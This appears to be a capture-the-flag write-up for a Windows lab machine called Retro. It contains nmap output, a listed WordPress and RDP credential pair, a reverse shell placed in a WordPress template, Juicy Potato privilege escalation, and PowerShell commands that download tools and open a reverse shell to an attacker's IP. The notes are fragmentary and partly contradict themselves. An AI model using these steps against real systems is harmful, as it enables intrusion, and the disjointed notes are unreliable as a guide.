@@ -1,0 +1,77 @@
+┌──(root💀kali)-[/home/golum/Desktop/DTOP/retro]
+└─# nmap -A -sC -sV -Pn 10.10.215.73                                          1 ⨯
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 10:15 IST
+Nmap scan report for 10.10.215.73
+Host is up (0.58s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2022-02-26T04:46:13+00:00
+| ssl-cert: Subject: commonName=RetroWeb
+| Not valid before: 2022-02-25T04:40:26
+|_Not valid after:  2022-08-27T04:40:26
+|_ssl-date: 2022-02-26T04:46:23+00:00; -17s from scanner time.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2016 (89%), FreeBSD 6.X (85%)
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
+Aggressive OS guesses: Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -17s, deviation: 0s, median: -18s
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   395.93 ms 10.4.0.1
+2   ... 3
+4   600.76 ms 10.10.215.73
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.97 seconds
+
+
+
+retroweb/retro/wp-login.php
+
+
+wade : parzival  RDP and (WOrdpress login-phprev shell)
+
+
+After a while of enumerating services and programs, I remember that we still have the Wordpress access and maybe the account that it is running the webserver is a different one and has different privileges.
+
+We start by logging in into Wordpress and creating a reverse shell in one of the page templates (you can set a reverse shell for Windows/PHP like this):
+
+Usually if the machine is a Windows 10 with version 1809 or higher, or a Windows Server 2019, we can use something like Rogue Potato attack to escalate privileges. Otherwise, we can try a Juicy Potato attack. I am not going to enter into details regarding this type of attack, but in order for it to be possible, we need a low privilege account with one of the following privileges:
+
+    ‘SeImpersonatePrivilege’
+    ‘SeAssignPrimaryTokenPrivilege’.
+
+So we conclude that the machine is running Windows Server 2016 and the user doesn’t have privileges to leverage our access to SYSTEM using something like a Potato privilege escalation attack.
+
+
+
+Perfect! This will allow us to run executables as a SYSTEM level process, so we also need something to execute with the JuicyPotato executable. In this case, we can just use another Reverse Shell that will pop a SYSTEM shell on our side.
+
+Invoke-WebRequest <resource_to_download> -outfile juicypotato.exe
+
+We can create one with MSFVenom or download one specific for this case, like the Nishang reverse shell from here.
+
+So lets download the Invoke-PowerShellTcp.ps1 from the Shells directory and save it on our machine. Additionally, lets add a new line in the end of the file, containing the following command, replacing the IP and Port with our own:
+
+Invoke-WebRequest <resource_to_download> -outfile invoke-powershelltcp
+Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
